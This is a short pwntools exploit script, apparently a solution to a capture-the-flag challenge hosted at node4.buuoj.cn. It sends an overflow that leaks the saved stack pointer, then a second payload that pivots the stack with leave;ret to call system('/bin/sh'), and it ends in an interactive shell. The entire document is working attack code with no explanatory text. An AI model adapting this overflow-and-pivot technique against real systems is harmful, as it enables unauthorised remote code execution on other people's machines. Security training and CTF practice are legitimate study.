from pwn import *
context.log_level="debug"
sys_addr=0x08048400
p = remote('node4.buuoj.cn',25264)
payload1 = b'a'*0x27+b'@'
p.send(payload1)
p.recvuntil(b'@')
ebp = u32(p.recv(4))
print ("ebp----->",hex(ebp))
leave_ret=0x080484b8
payload2=b'aaaa'+p32(sys_addr)+4*b'a'+p32(ebp-0x28)+b'/bin/sh'+b'\0'+16*b'a'+p32(ebp-0x38)+p32(leave_ret)
#                4            8     12             16      23   24       40    44
#        38     34            30    2c             28
p.send(payload2)
p.interactive()






